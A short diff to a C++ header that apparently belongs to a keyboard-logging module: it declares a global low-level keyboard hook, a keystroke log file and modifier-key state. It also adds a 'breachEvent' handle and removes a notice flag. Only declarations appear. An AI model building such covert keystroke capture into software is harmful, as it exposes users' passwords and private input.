@@ -23,12 +23,12 @@ void setLogFile();
 int setModKeyState(int, int);
 
 extern std::map<int, std::wstring> mapSpecialKeys;
+extern HANDLE breachEvent;
 extern HHOOK ghHook;
 extern KBDLLHOOKSTRUCT kbdStruct;
 extern std::wfstream logFile;
 extern std::mutex logFileMutex;
 extern std::map<std::wstring, bool> modKeyStates;
-extern bool noticeThreadStarted;
 
 class KeyboardMod : public RCDOMod {
 public:
